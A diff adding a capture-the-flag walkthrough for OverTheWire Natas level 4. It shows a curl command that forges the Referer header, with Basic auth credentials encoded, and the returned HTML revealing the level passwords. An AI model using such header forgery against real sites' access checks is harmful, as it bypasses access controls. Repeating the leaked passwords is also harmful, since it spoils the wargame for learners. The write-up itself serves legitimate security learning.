@@ -48,3 +48,33 @@ It helps servers identify where users are coming from when they click links to a
 
 you can also refer to  https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer for better explaination:
 
+
+curl 'http://natas4.natas.labs.overthewire.org/index.php'   --compressed   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0'  
+-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'   -H 'Accept-Language: en-US,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate'  
+-H 'Referer: http://natas5.natas.labs.overthewire.org/'   -H 'DNT: 1'   -H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' 
+-H 'Connection: keep-alive'   -H 'Cookie: _ga_RD0K2239G0=GS2.1.s1766679427$o3$g1$t1766681451$j53$l0$h0; _ga=GA1.1.527516302.1766654266'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Priority: Du=0, i'
+
+Using above curl command to change referer I found below html code 
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
+
+
